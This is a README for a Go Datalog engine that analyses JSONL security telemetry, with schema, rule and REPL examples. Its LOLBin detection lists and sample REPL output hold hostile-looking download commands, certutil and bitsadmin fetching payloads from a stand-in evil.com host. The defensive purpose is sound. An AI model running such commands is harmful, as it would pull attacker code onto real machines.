# datalog

A Datalog query engine for Go, designed for rule-based analysis of structured data -- particularly security telemetry in JSONL format.

```
go get swdunlop.dev/pkg/datalog
```

## Quick Start

```go
package main

import (
    "context"
    "fmt"
    "os"
    "slices"

    "swdunlop.dev/pkg/datalog"
    "swdunlop.dev/pkg/datalog/jsonfacts"
    "swdunlop.dev/pkg/datalog/seminaive"
    "swdunlop.dev/pkg/datalog/syntax"
)

func main() {
    // 1. Load facts from JSONL files using a schema configuration.
    var cfg jsonfacts.Config
    if err := cfg.LoadSchemaDir("schemas"); err != nil {
        panic(err)
    }
    db, err := cfg.LoadDir("data")
    if err != nil {
        panic(err)
    }

    // 2. Parse Datalog rules and compile them into a transformer.
    tr, err := syntax.Parse(seminaive.New(), `
        suspicious(Pid, Cmd) :-
            process(Pid, Cmd),
            contains(Cmd, Pattern),
            not allowlisted(Cmd).
    `)
    if err != nil {
        panic(err)
    }

    // 3. Apply rules to derive new facts.
    output, err := tr.Transform(context.Background(), db)
    if err != nil {
        panic(err)
    }

    // 4. Query and output results.
    enc := jsonfacts.NewEncoder(os.Stdout, slices.Collect(output.Declarations()))
    for row := range output.Query("suspicious", datalog.Variable("Pid"), datalog.Variable("Cmd")) {
        enc.Encode("suspicious", row)
    }
}
```

## Packages

| Package | Description |
|---------|-------------|
| [`datalog`](.) | Core interfaces: `Database`, `Transformer`, term types |
| [`datalog/syntax`](./syntax) | Parser and abstract syntax tree for Datalog programs |
| [`datalog/memory`](./memory) | Dictionary-encoded in-memory database implementation |
| [`datalog/seminaive`](./seminaive) | Semi-naive evaluation engine with stratified negation |
| [`datalog/jsonfacts`](./jsonfacts) | JSONL schema loading, pattern matching, and encoding |
| [`datalog/cmd/datalog`](./cmd/datalog) | Interactive REPL and batch processor |

## Loading JSONL Data

The `jsonfacts` package maps JSONL files to Datalog facts using a JSON or YAML schema. Expressions use [expr-lang](https://expr-lang.org/) for field extraction and filtering. A schema has three sections: **sources**, **matchers**, and **declarations**.

### Sources and Simple Mappings

Each source names a JSONL file and one or more mappings. A simple mapping extracts one fact per line using [expr-lang](https://expr-lang.org/) expressions:

```json
{
    "sources": [{
        "file": "processes.jsonl",
        "mappings": [{
            "predicate": "process",
            "args": ["value.pid", "value.name", "value.cmdline"],
            "filter": "value.pid != 0"
        }]
    }]
}
```

Given a JSONL line `{"pid": 1234, "name": "cmd.exe", "cmdline": "cmd /c whoami"}`, this produces the fact:

```
process(1234, "cmd.exe", "cmd /c whoami")
```

The `filter` is optional; when present, it must evaluate to `true` for the fact to be emitted.

### Imperative Mappings

When a single JSON line should produce multiple facts, use an `expr` program with `fresh_id()` and `assert()`:

```json
{
    "sources": [{
        "file": "emails.jsonl",
        "mappings": [{
            "expr": "let id = fresh_id(); assert(\"email\", [id, value.sender, value.time]); map(value.recipients, assert(\"email_to\", [id, #]))"
        }]
    }]
}
```

Given `{"sender": "alice", "time": "2024-01-01", "recipients": ["bob", "carol"]}`, this produces:

```
email(#0, "alice", "2024-01-01")
email_to(#0, "bob")
email_to(#0, "carol")
```

The `#0` is a synthetic ID that joins related facts derived from the same input value.

Available functions in imperative mode:

| Function | Description |
|----------|-------------|
| `fresh_id()` | Generate a synthetic unique ID |
| `assert(pred, args)` | Emit a fact |
| `match_contains(pred, key, haystack, patterns)` | Emit `pred(key, pattern)` for substring matches |
| `match_starts_with(pred, key, str, patterns)` | Emit `pred(key, pattern)` for prefix matches |
| `match_ends_with(pred, key, str, patterns)` | Emit `pred(key, pattern)` for suffix matches |
| `match_regex(pred, key, str, patterns)` | Emit `pred(key, pattern)` for regex matches |

### Declarations

Declarations name the terms of each predicate for structured JSONL output:

```json
{
    "declarations": [{
        "name": "process",
        "use": "A running process observed on a host.",
        "terms": [
            {"name": "pid", "use": "Process ID"},
            {"name": "name", "use": "Executable name"},
            {"name": "cmdline", "use": "Full command line"}
        ]
    }]
}
```

## Writing Datalog Rules

Rules derive new facts from existing ones. A rule has a head (the derived fact) and a body (conditions that must be satisfied):

```prolog
% Facts (rules with no body)
allowlisted("svchost.exe").

% Simple derivation
child_process(Parent, Child) :- spawned(Parent, Child).

% Transitive closure (recursive)
descendant(P, C) :- child_process(P, C).
descendant(P, C) :- child_process(P, M), descendant(M, C).

% Negation (stratified)
unexpected(Pid, Cmd) :- process(Pid, Cmd), not allowlisted(Cmd).

% Constraints
large_transfer(From, To, Amt) :- transfer(From, To, Amt), Amt > 10000.

% Arithmetic
cost(Item, Total) :- price(Item, P), tax_rate(Rate), Total is P * (1 + Rate).

% String builtins
matched(Str) :- data(Str), @contains(Str, "password").

% Aggregates
alert_count(Sev, N) :- N = count : alert(?, Sev, ?).
total_bytes(Host, T) :- T = sum(Bytes) : traffic(Host, Bytes).
```

Comments start with `%`. Anonymous variables use `?`.

### Syntax Summary

| Form | Example |
|------|---------|
| Fact | `parent("tom", "bob").` |
| Rule | `ancestor(X, Y) :- parent(X, Z), ancestor(Z, Y).` |
| Query | `ancestor("tom", X)?` |
| Negation | `orphan(X) :- person(X), not parent(?, X).` |
| Comparison | `X != Y`, `Amt > 1000`, `X <= Y` |
| Arithmetic | `Y is X * 2 + 1` |
| Aggregate | `N = count : pred(X).` / `T = sum(V) : pred(X, V).` |
| Builtin (constraint) | `@contains(Str, "needle")` |
| Builtin (binding) | `@time_diff(T2, T1, D)` |

### Custom Builtins

Register custom binding builtins with `WithBuiltin` to extend the engine with application-specific functions. In rule bodies, all arguments except the last are inputs; the last is the output variable:

```go
engine := seminaive.New(
    seminaive.WithBuiltin("@double", func(inputs []any) (any, bool) {
        v, ok := inputs[0].(int64)
        if !ok { return nil, false }
        return v * 2, true
    }),
)
```

```prolog
doubled(Name, D) :- val(Name, V), @double(V, D).
```

Builtin names start with `@` by convention. Inputs are resolved Go values (`int64`, `float64`, `string`, or `datalog.ID`). The package includes `seminaive.TimeDiff` for computing timestamp differences in seconds:

```go
engine := seminaive.New(seminaive.WithBuiltin("@time_diff", seminaive.TimeDiff))
```

```prolog
% @time_diff accepts RFC3339 strings or numeric epoch values.
duration(A, B, D) :- event(A, T1), event(B, T2), @time_diff(T2, T1, D), A != B.
```

### Profiling

Use `WithProfile` to receive per-stratum evaluation metrics:

```go
engine := seminaive.New(seminaive.WithProfile(func(stats []seminaive.StratumStats) {
    for _, s := range stats {
        fmt.Printf("%v: %d facts in %d iterations (%v)\n",
            s.Predicates, s.FactCount, s.Iterations, s.Duration)
    }
}))
```

## Querying Results

After transformation, query the output database with constants (exact match) and variables (wildcard):

```go
// All suspicious processes
for row := range output.Facts("suspicious", 2) {
    pid := row[0].(datalog.Integer)
    cmd := row[1].(datalog.String)
    fmt.Printf("PID %d: %s\n", pid, cmd)
}

// Pattern-matched query: find suspicious processes for a specific PID
for row := range output.Query("suspicious",
    datalog.Integer(1234),
    datalog.Variable("Cmd"),
) {
    fmt.Println(row[1])
}
```

## Working with Databases

The `memory` package provides a `Database` implementation with additional methods for programmatic use:

```go
// Predicates returns all predicate name/arity pairs in the database.
for name, arity := range db.Predicates() {
    fmt.Printf("%s/%d\n", name, arity)
}

// Extend returns a new database with additional facts, without modifying the original.
extended := db.Extend(
    datalog.Fact{Name: "parent", Terms: []datalog.Constant{datalog.String("bob"), datalog.String("ann")}},
)
```

## Schema Configuration Reference

A complete schema file (JSON or YAML) with all sections:

```yaml
sources:
  - file: processes.jsonl
    mappings:
      - predicate: process
        args: ["value.pid", "value.name", "value.cmdline"]
      - predicate: process_user
        args: ["value.pid", "value.user"]
        filter: "value.user != ''"

matchers:
  - predicate: process
    term: 2                    # match against cmdline (third term)
    case_insensitive: true
    windash: true              # match -flag and /flag interchangeably
    contains:
      - certutil
      - bitsadmin
      - "Invoke-WebRequest"
    contains_from: lolbins.txt # load additional patterns from file
    regex_match:
      - "T[0-9]{4}\\.[0-9]{3}"

  - predicate: host_ip
    term: 0
    cidr:
      - "10.0.0.0/8"
      - "192.168.0.0/16"

declarations:
  - name: process
    terms:
      - {name: pid}
      - {name: name}
      - {name: cmdline}
  - name: suspicious
    use: "Processes matching known-bad patterns."
    terms:
      - {name: pid}
      - {name: cmdline}
```

### Matcher Types

| Type | Predicate Emitted | Description |
|------|-------------------|-------------|
| `contains` | `contains(value, pattern)` | Substring match |
| `starts_with` | `starts_with(value, pattern)` | Prefix match |
| `ends_with` | `ends_with(value, pattern)` | Suffix match |
| `regex_match` | `regex_match(value, pattern)` | Go regexp match |
| `base64` | `base64_contains(value, pattern)` | Finds pattern in base64-encoded data (checks all 3 byte-alignment offsets) |
| `base64_utf16le` | `base64_utf16le_contains(value, pattern)` | Like `base64` but encodes pattern as UTF-16LE first (for PowerShell `-EncodedCommand`) |
| `cidr` | `cidr_match(ip, cidr)` | IP address in CIDR network |

### Matcher Modifiers

| Modifier | Predicate Prefix | Effect |
|----------|-----------------|--------|
| `case_insensitive: true` | `ci_` | Case-insensitive string matching |
| `windash: true` | `wd_` | Match `-` and `/` interchangeably (for Windows command-line flags) |

When both are set, the prefix is `ci_wd_`. For example, `ci_wd_contains(value, pattern)`.

### Pattern Files

Each matcher type has a corresponding `_from` field that loads patterns from an external file:

```
# patterns.txt -- one pattern per line, # comments
certutil
bitsadmin
Invoke-WebRequest
```

Referenced as:

```json
{"predicate": "process", "term": 2, "contains_from": "patterns.txt"}
```

Pattern files are resolved at schema load time and their contents are merged into the inline lists, making the resulting `Config` self-contained.

### Multiple Schema Files

`LoadSchemaDir` loads all `*.json` files from a directory and merges their sources, matchers, and declarations. This allows organizing schemas by data source or concern:

```
schemas/
  processes.json    -- sources + matchers for process data
  network.json      -- sources + matchers for network data
  declarations.json -- shared declarations for output
```

## Security Data Examples

### Process Execution Monitoring

Detect use of living-off-the-land binaries (LOLBins) in process command lines:

```yaml
sources:
  - file: process_events.jsonl
    mappings:
      - predicate: process
        args: ["value.hostname", "value.pid", "value.parent_pid", "value.cmdline"]

matchers:
  - predicate: process
    term: 3
    case_insensitive: true
    windash: true
    contains:
      - certutil
      - bitsadmin
      - "Invoke-WebRequest"
      - "Invoke-Expression"
      - mshta
      - regsvr32
      - rundll32
    regex_match:
      - "-e(nc|ncodedcommand)\\s"
```

Rules for building a process tree and flagging suspicious chains:

```prolog
% Build parent-child relationships.
parent(Host, Parent, Child) :- process(Host, Child, Parent, _).

% Transitive ancestor relationship.
ancestor(Host, Anc, Desc) :- parent(Host, Anc, Desc).
ancestor(Host, Anc, Desc) :- parent(Host, Anc, Mid), ancestor(Host, Mid, Desc).

% A process is suspicious if its command line matches a known-bad pattern.
suspicious(Host, Pid, Cmd) :-
    process(Host, Pid, _, Cmd),
    ci_wd_contains(Cmd, _).

% An alert fires if a suspicious process descends from a browser.
browser_child_alert(Host, BrowserPid, SusPid, Cmd) :-
    process(Host, BrowserPid, _, BrowserCmd),
    ci_contains(BrowserCmd, "chrome"),
    ancestor(Host, BrowserPid, SusPid),
    suspicious(Host, SusPid, Cmd).
```

### Network Connection Analysis

Match connections against known-bad CIDR ranges and detect lateral movement:

```yaml
sources:
  - file: connections.jsonl
    mappings:
      - predicate: conn
        args: ["value.src_ip", "value.src_port", "value.dst_ip", "value.dst_port", "value.proto"]

matchers:
  - predicate: conn
    term: 0
    cidr:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"

  - predicate: conn
    term: 2
    starts_with:
      - "10.0."
      - "192.168."
    ends_with_from: known_c2_domains.txt
```

```prolog
% Internal-to-internal connections (lateral movement candidates).
lateral(Src, Dst, Port) :-
    conn(Src, _, Dst, Port, _),
    cidr_match(Src, "10.0.0.0/8"),
    cidr_match(Dst, "10.0.0.0/8"),
    Src != Dst.

% Count connections per source.
conn_count(Src, N) :- N = count : conn(Src, ?, ?, ?, ?).

% High-volume sources.
high_volume(Src, N) :- conn_count(Src, N), N > 1000.
```

### Email Attachment Analysis

Use imperative mappings to decompose nested JSON and correlate across entities:

```yaml
sources:
  - file: email_events.jsonl
    mappings:
      - expr: |
          let id = fresh_id();
          assert("email", [id, value.sender, value.subject, value.timestamp]);
          map(value.recipients, assert("email_to", [id, #]));
          map(value.attachments, (
            let aid = fresh_id();
            assert("attachment", [id, aid, #.filename, #.sha256, #.size])
          ))

declarations:
  - name: email
    terms: [{name: id}, {name: sender}, {name: subject}, {name: timestamp}]
  - name: email_to
    terms: [{name: email_id}, {name: recipient}]
  - name: attachment
    terms: [{name: email_id}, {name: attachment_id}, {name: filename}, {name: sha256}, {name: size}]
```

```prolog
% Flag emails with executable attachments.
executable_attachment(EmailId, Filename, Hash) :-
    attachment(EmailId, ?, Filename, Hash, ?),
    @ends_with(Filename, ".exe").

% Multi-recipient emails with executables.
broadcast_executable(Sender, Subject, Filename) :-
    executable_attachment(EmailId, Filename, ?),
    email(EmailId, Sender, Subject, ?),
    email_to(EmailId, R1),
    email_to(EmailId, R2),
    R1 != R2.
```

## JSONL Encoder

Write derived facts back to JSONL using declarations for named fields:

```go
decls := slices.Collect(output.Declarations())
enc := jsonfacts.NewEncoder(os.Stdout, decls)

for row := range output.Facts("suspicious", 3) {
    enc.Encode("suspicious", row)
}
// Output: {"suspicious": {"host": "ws01", "pid": 1234, "cmdline": "certutil -urlcache ..."}}
```

Without declarations, terms are keyed by position (`"0"`, `"1"`, ...).

## CLI REPL

The `cmd/datalog` binary provides an interactive REPL for exploring data:

```
$ datalog -c schema.yaml -d ./data rules.dl
datalog — Datalog REPL
Type .help for commands, .quit to exit.

?> .list
  process/4  (15234 facts)
  contains/2  (89 facts)

?> suspicious(Host, Pid, Cmd)?
  Host = "ws01", Pid = 1234, Cmd = "certutil -urlcache -split -f http://evil.com/payload"
  Host = "ws03", Pid = 5678, Cmd = "bitsadmin /transfer myJob http://evil.com/update"
  (2 results)

?> N = count : suspicious(?, ?, ?)?
  N = 2
  (1 results)
```

Commands:

| Command | Description |
|---------|-------------|
| `.help` | Show available commands |
| `.load <file.dl>` | Load Datalog statements from a file |
| `.reload` | Reload JSONL data from the configured source |
| `.list` | List all predicates with fact counts |
| `.rules` | Show defined rules |
| `.facts <pred>/<arity>` | Dump facts for a predicate |
| `.clear [rules\|facts\|all]` | Clear rules and/or facts |
| `.quit` | Exit |

Pipe mode (non-interactive) reads statements from stdin:

```
echo 'ancestor("tom", X)?' | datalog -c schema.yaml -d ./data rules.dl
```

## How It Works

### Architecture

```
JSONL files ──→ jsonfacts.Config.LoadDir() ──→ memory.Database
                                                      │
Datalog rules ──→ syntax.ParseAll() ──→ Ruleset       │
                                          │            │
                  seminaive.New().Compile(rs) ──→ Transformer
                                                      │
                                    tr.Transform(ctx, db)
                                                      │
                                              output Database
                                                      │
                                    ┌─────────────────┼──────────────────┐
                                    │                 │                  │
                             db.Query()        db.Facts()     jsonfacts.Encoder
```

### Dictionary Encoding

The `memory` package interns all constant values into a dictionary that maps each unique value to a sequential `uint64`. Facts are stored as tuples of these IDs rather than as Go values, which reduces memory usage and makes equality comparison a single integer operation. The dictionary preserves type ordering (float < int < string < ID) for deterministic output.

### Semi-Naive Evaluation

The `seminaive` package implements bottom-up evaluation with delta tracking:

1. Initialize the fact set with all input facts plus any facts in the rules.
2. On each iteration, evaluate each rule using only the *newly derived* facts (deltas) from the previous iteration, joined against the full fact set.
3. Any facts derived this iteration that are not already known become the new deltas.
4. Repeat until no new facts are derived (fixpoint) or the iteration limit is reached.

This avoids the redundant re-derivation of existing facts that naive evaluation would perform, making recursive rules practical over large datasets.

### Stratification

Programs with negation are partitioned into strata using Tarjan's SCC algorithm. Within each stratum, rules are evaluated to fixpoint before the next stratum begins. This ensures that when a rule references `not p(...)`, predicate `p` is already fully computed. Negation cycles are rejected at compile time.

### Performance

The engine uses several optimizations to minimize GC pressure:

- **Stack-allocated substitutions**: Variable bindings during rule evaluation use fixed-size arrays (`[16]uint64`) with bitmasks rather than heap-allocated maps.
- **Pre-compiled atoms**: Predicate names and constant terms are interned once at compile time and reused across all iterations.
- **Gate regexps**: Matchers compile a combined "gate" regexp from all patterns; facts that fail the gate are skipped without checking individual patterns.
- **Indexed fact storage**: Facts are indexed by predicate and optionally by the first bound argument for fast join lookups.
